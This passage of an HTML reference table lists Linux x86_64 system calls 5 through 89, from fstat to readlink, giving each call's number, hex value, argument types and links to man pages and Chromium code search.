*statbuf</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">5</td><td>fstat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fstat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fstat">cs/</a></td><td align="center">0x05</td><td>unsigned int fd</td><td>struct __old_kernel_stat *statbuf</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">6</td><td>lstat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/lstat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*lstat">cs/</a></td><td align="center">0x06</td><td>const char *filename</td><td>struct __old_kernel_stat *statbuf</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">7</td><td>poll</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/poll.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*poll">cs/</a></td><td align="center">0x07</td><td>struct pollfd *ufds</td><td>unsigned int nfds</td><td>int timeout</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">8</td><td>lseek</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/lseek.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*lseek">cs/</a></td><td align="center">0x08</td><td>unsigned int fd</td><td>off_t offset</td><td>unsigned int whence</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">9</td><td>mmap</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mmap.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mmap">cs/</a></td><td align="center">0x09</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">10</td><td>mprotect</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mprotect.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mprotect">cs/</a></td><td align="center">0x0a</td><td>unsigned long start</td><td>size_t len</td><td>unsigned long prot</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">11</td><td>munmap</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/munmap.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*munmap">cs/</a></td><td align="center">0x0b</td><td>unsigned long addr</td><td>size_t len</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">12</td><td>brk</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/brk.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*brk">cs/</a></td><td align="center">0x0c</td><td>unsigned long brk</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">13</td><td>rt_sigaction</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/rt_sigaction.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rt_sigaction">cs/</a></td><td align="center">0x0d</td><td>int</td><td>const struct sigaction *</td><td>struct sigaction *</td><td>size_t</td><td>-</td><td>-</td></tr><tr><td align="center">14</td><td>rt_sigprocmask</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/rt_sigprocmask.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rt_sigprocmask">cs/</a></td><td align="center">0x0e</td><td>int how</td><td>sigset_t *set</td><td>sigset_t *oset</td><td>size_t sigsetsize</td><td>-</td><td>-</td></tr><tr><td align="center">15</td><td>rt_sigreturn</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/rt_sigreturn.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rt_sigreturn">cs/</a></td><td align="center">0x0f</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">16</td><td>ioctl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ioctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ioctl">cs/</a></td><td align="center">0x10</td><td>unsigned int fd</td><td>unsigned int cmd</td><td>unsigned long arg</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">17</td><td>pread64</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pread64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pread64">cs/</a></td><td align="center">0x11</td><td>unsigned int fd</td><td>char *buf</td><td>size_t count</td><td>loff_t pos</td><td>-</td><td>-</td></tr><tr><td align="center">18</td><td>pwrite64</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pwrite64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pwrite64">cs/</a></td><td align="center">0x12</td><td>unsigned int fd</td><td>const char *buf</td><td>size_t count</td><td>loff_t pos</td><td>-</td><td>-</td></tr><tr><td align="center">19</td><td>readv</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/readv.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*readv">cs/</a></td><td align="center">0x13</td><td>unsigned long fd</td><td>const struct iovec *vec</td><td>unsigned long vlen</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">20</td><td>writev</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/writev.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*writev">cs/</a></td><td align="center">0x14</td><td>unsigned long fd</td><td>const struct iovec *vec</td><td>unsigned long vlen</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">21</td><td>access</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/access.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*access">cs/</a></td><td align="center">0x15</td><td>const char *filename</td><td>int mode</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">22</td><td>pipe</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pipe.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pipe">cs/</a></td><td align="center">0x16</td><td>int *fildes</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">23</td><td>select</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/select.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*select">cs/</a></td><td align="center">0x17</td><td>int n</td><td>fd_set *inp</td><td>fd_set *outp</td><td>fd_set *exp</td><td>struct timeval *tvp</td><td>-</td></tr><tr><td align="center">24</td><td>sched_yield</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_yield.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_yield">cs/</a></td><td align="center">0x18</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">25</td><td>mremap</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mremap.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mremap">cs/</a></td><td align="center">0x19</td><td>unsigned long addr</td><td>unsigned long old_len</td><td>unsigned long new_len</td><td>unsigned long flags</td><td>unsigned long new_addr</td><td>-</td></tr><tr><td align="center">26</td><td>msync</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/msync.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*msync">cs/</a></td><td align="center">0x1a</td><td>unsigned long start</td><td>size_t len</td><td>int flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">27</td><td>mincore</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mincore.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mincore">cs/</a></td><td align="center">0x1b</td><td>unsigned long start</td><td>size_t len</td><td>unsigned char * vec</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">28</td><td>madvise</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/madvise.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*madvise">cs/</a></td><td align="center">0x1c</td><td>unsigned long start</td><td>size_t len</td><td>int behavior</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">29</td><td>shmget</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/shmget.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*shmget">cs/</a></td><td align="center">0x1d</td><td>key_t key</td><td>size_t size</td><td>int flag</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">30</td><td>shmat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/shmat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*shmat">cs/</a></td><td align="center">0x1e</td><td>int shmid</td><td>char *shmaddr</td><td>int shmflg</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">31</td><td>shmctl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/shmctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*shmctl">cs/</a></td><td align="center">0x1f</td><td>int shmid</td><td>int cmd</td><td>struct shmid_ds *buf</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">32</td><td>dup</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/dup.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*dup">cs/</a></td><td align="center">0x20</td><td>unsigned int fildes</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">33</td><td>dup2</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/dup2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*dup2">cs/</a></td><td align="center">0x21</td><td>unsigned int oldfd</td><td>unsigned int newfd</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">34</td><td>pause</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pause.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pause">cs/</a></td><td align="center">0x22</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">35</td><td>nanosleep</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/nanosleep.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*nanosleep">cs/</a></td><td align="center">0x23</td><td>struct __kernel_timespec *rqtp</td><td>struct __kernel_timespec *rmtp</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">36</td><td>getitimer</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getitimer.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getitimer">cs/</a></td><td align="center">0x24</td><td>int which</td><td>struct itimerval *value</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">37</td><td>alarm</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/alarm.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*alarm">cs/</a></td><td align="center">0x25</td><td>unsigned int seconds</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">38</td><td>setitimer</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setitimer.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setitimer">cs/</a></td><td align="center">0x26</td><td>int which</td><td>struct itimerval *value</td><td>struct itimerval *ovalue</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">39</td><td>getpid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getpid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getpid">cs/</a></td><td align="center">0x27</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">40</td><td>sendfile</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sendfile.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sendfile">cs/</a></td><td align="center">0x28</td><td>int out_fd</td><td>int in_fd</td><td>off_t *offset</td><td>size_t count</td><td>-</td><td>-</td></tr><tr><td align="center">41</td><td>socket</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/socket.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*socket">cs/</a></td><td align="center">0x29</td><td>int</td><td>int</td><td>int</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">42</td><td>connect</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/connect.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*connect">cs/</a></td><td align="center">0x2a</td><td>int</td><td>struct sockaddr *</td><td>int</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">43</td><td>accept</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/accept.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*accept">cs/</a></td><td align="center">0x2b</td><td>int</td><td>struct sockaddr *</td><td>int *</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">44</td><td>sendto</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sendto.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sendto">cs/</a></td><td align="center">0x2c</td><td>int</td><td>void *</td><td>size_t</td><td>unsigned</td><td>struct sockaddr *</td><td>int</td></tr><tr><td align="center">45</td><td>recvfrom</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/recvfrom.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*recvfrom">cs/</a></td><td align="center">0x2d</td><td>int</td><td>void *</td><td>size_t</td><td>unsigned</td><td>struct sockaddr *</td><td>int *</td></tr><tr><td align="center">46</td><td>sendmsg</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sendmsg.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sendmsg">cs/</a></td><td align="center">0x2e</td><td>int fd</td><td>struct user_msghdr *msg</td><td>unsigned flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">47</td><td>recvmsg</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/recvmsg.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*recvmsg">cs/</a></td><td align="center">0x2f</td><td>int fd</td><td>struct user_msghdr *msg</td><td>unsigned flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">48</td><td>shutdown</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/shutdown.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*shutdown">cs/</a></td><td align="center">0x30</td><td>int</td><td>int</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">49</td><td>bind</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/bind.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*bind">cs/</a></td><td align="center">0x31</td><td>int</td><td>struct sockaddr *</td><td>int</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">50</td><td>listen</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/listen.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*listen">cs/</a></td><td align="center">0x32</td><td>int</td><td>int</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">51</td><td>getsockname</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getsockname.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getsockname">cs/</a></td><td align="center">0x33</td><td>int</td><td>struct sockaddr *</td><td>int *</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">52</td><td>getpeername</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getpeername.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getpeername">cs/</a></td><td align="center">0x34</td><td>int</td><td>struct sockaddr *</td><td>int *</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">53</td><td>socketpair</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/socketpair.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*socketpair">cs/</a></td><td align="center">0x35</td><td>int</td><td>int</td><td>int</td><td>int *</td><td>-</td><td>-</td></tr><tr><td align="center">54</td><td>setsockopt</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setsockopt.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setsockopt">cs/</a></td><td align="center">0x36</td><td>int fd</td><td>int level</td><td>int optname</td><td>char *optval</td><td>int optlen</td><td>-</td></tr><tr><td align="center">55</td><td>getsockopt</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getsockopt.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getsockopt">cs/</a></td><td align="center">0x37</td><td>int fd</td><td>int level</td><td>int optname</td><td>char *optval</td><td>int *optlen</td><td>-</td></tr><tr><td align="center">56</td><td>clone</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/clone.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*clone">cs/</a></td><td align="center">0x38</td><td>unsigned long</td><td>unsigned long</td><td>int *</td><td>int *</td><td>unsigned long</td><td>-</td></tr><tr><td align="center">57</td><td>fork</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fork.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fork">cs/</a></td><td align="center">0x39</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">58</td><td>vfork</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/vfork.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*vfork">cs/</a></td><td align="center">0x3a</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">59</td><td>execve</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/execve.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*execve">cs/</a></td><td align="center">0x3b</td><td>const char *filename</td><td>const char *const *argv</td><td>const char *const *envp</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">60</td><td>exit</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/exit.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*exit">cs/</a></td><td align="center">0x3c</td><td>int error_code</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">61</td><td>wait4</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/wait4.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*wait4">cs/</a></td><td align="center">0x3d</td><td>pid_t pid</td><td>int *stat_addr</td><td>int options</td><td>struct rusage *ru</td><td>-</td><td>-</td></tr><tr><td align="center">62</td><td>kill</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/kill.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*kill">cs/</a></td><td align="center">0x3e</td><td>pid_t pid</td><td>int sig</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">63</td><td>uname</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/uname.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*uname">cs/</a></td><td align="center">0x3f</td><td>struct old_utsname *</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">64</td><td>semget</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/semget.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*semget">cs/</a></td><td align="center">0x40</td><td>key_t key</td><td>int nsems</td><td>int semflg</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">65</td><td>semop</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/semop.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*semop">cs/</a></td><td align="center">0x41</td><td>int semid</td><td>struct sembuf *sops</td><td>unsigned nsops</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">66</td><td>semctl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/semctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*semctl">cs/</a></td><td align="center">0x42</td><td>int semid</td><td>int semnum</td><td>int cmd</td><td>unsigned long arg</td><td>-</td><td>-</td></tr><tr><td align="center">67</td><td>shmdt</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/shmdt.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*shmdt">cs/</a></td><td align="center">0x43</td><td>char *shmaddr</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">68</td><td>msgget</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/msgget.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*msgget">cs/</a></td><td align="center">0x44</td><td>key_t key</td><td>int msgflg</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">69</td><td>msgsnd</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/msgsnd.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*msgsnd">cs/</a></td><td align="center">0x45</td><td>int msqid</td><td>struct msgbuf *msgp</td><td>size_t msgsz</td><td>int msgflg</td><td>-</td><td>-</td></tr><tr><td align="center">70</td><td>msgrcv</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/msgrcv.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*msgrcv">cs/</a></td><td align="center">0x46</td><td>int msqid</td><td>struct msgbuf *msgp</td><td>size_t msgsz</td><td>long msgtyp</td><td>int msgflg</td><td>-</td></tr><tr><td align="center">71</td><td>msgctl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/msgctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*msgctl">cs/</a></td><td align="center">0x47</td><td>int msqid</td><td>int cmd</td><td>struct msqid_ds *buf</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">72</td><td>fcntl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fcntl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fcntl">cs/</a></td><td align="center">0x48</td><td>unsigned int fd</td><td>unsigned int cmd</td><td>unsigned long arg</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">73</td><td>flock</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/flock.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*flock">cs/</a></td><td align="center">0x49</td><td>unsigned int fd</td><td>unsigned int cmd</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">74</td><td>fsync</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fsync.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fsync">cs/</a></td><td align="center">0x4a</td><td>unsigned int fd</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">75</td><td>fdatasync</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fdatasync.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fdatasync">cs/</a></td><td align="center">0x4b</td><td>unsigned int fd</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">76</td><td>truncate</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/truncate.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*truncate">cs/</a></td><td align="center">0x4c</td><td>const char *path</td><td>long length</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">77</td><td>ftruncate</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ftruncate.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ftruncate">cs/</a></td><td align="center">0x4d</td><td>unsigned int fd</td><td>unsigned long length</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">78</td><td>getdents</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getdents.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getdents">cs/</a></td><td align="center">0x4e</td><td>unsigned int fd</td><td>struct linux_dirent *dirent</td><td>unsigned int count</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">79</td><td>getcwd</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getcwd.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getcwd">cs/</a></td><td align="center">0x4f</td><td>char *buf</td><td>unsigned long size</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">80</td><td>chdir</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/chdir.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*chdir">cs/</a></td><td align="center">0x50</td><td>const char *filename</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">81</td><td>fchdir</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fchdir.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fchdir">cs/</a></td><td align="center">0x51</td><td>unsigned int fd</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">82</td><td>rename</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/rename.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rename">cs/</a></td><td align="center">0x52</td><td>const char *oldname</td><td>const char *newname</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">83</td><td>mkdir</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mkdir.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mkdir">cs/</a></td><td align="center">0x53</td><td>const char *pathname</td><td>umode_t mode</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">84</td><td>rmdir</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/rmdir.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rmdir">cs/</a></td><td align="center">0x54</td><td>const char *pathname</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">85</td><td>creat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/creat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*creat">cs/</a></td><td align="center">0x55</td><td>const char *pathname</td><td>umode_t mode</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">86</td><td>link</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/link.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*link">cs/</a></td><td align="center">0x56</td><td>const char *oldname</td><td>const char *newname</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">87</td><td>unlink</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/unlink.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*unlink">cs/</a></td><td align="center">0x57</td><td>const char *pathname</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">88</td><td>symlink</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/symlink.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*symlink">cs/</a></td><td align="center">0x58</td><td>const char *old</td><td>const char *new</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">89</td><td>readlink</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/readlink.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*readlink">cs/</a></td><td align="center">0x59</td><td>const char *path</td><td>char *buf</td><td>int bufsiz</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">90</td><td>chmod</td><td align="center"><a 